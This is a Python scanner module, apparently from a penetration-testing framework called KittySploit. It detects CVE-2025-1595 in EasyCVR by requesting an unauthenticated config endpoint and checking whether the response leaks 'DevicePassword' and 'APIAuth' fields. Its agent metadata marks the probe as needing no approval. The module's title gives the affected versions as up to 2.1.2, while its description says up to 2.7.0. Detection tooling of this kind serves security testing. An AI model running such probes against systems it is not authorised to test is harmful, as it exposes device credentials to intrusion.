#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability has been found in Anhui Xufan Information Technology EasyCVR up to 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'EasyCVR <=2.1.2 - Information Disclosure Detection',
        'description': 'A vulnerability has been found in Anhui Xufan Information Technology EasyCVR up to 2.7.0 and classified as problematic. This vulnerability affects unknown code of the file /api/v1/getbaseconfig. The manipulation leads to information disclosure. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'exposure', 'easycvr', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2025-1595'],
        'cve': 'CVE-2025-1595',
    }

    def run(self):
        path = '/api/v1/getbaseconfig'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('DevicePassword":', 'APIAuth":',)
        ctype_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='EasyCVR <=2.1.2 - Information Disclosure detected',
                path=path,
            )
            return True
        return False

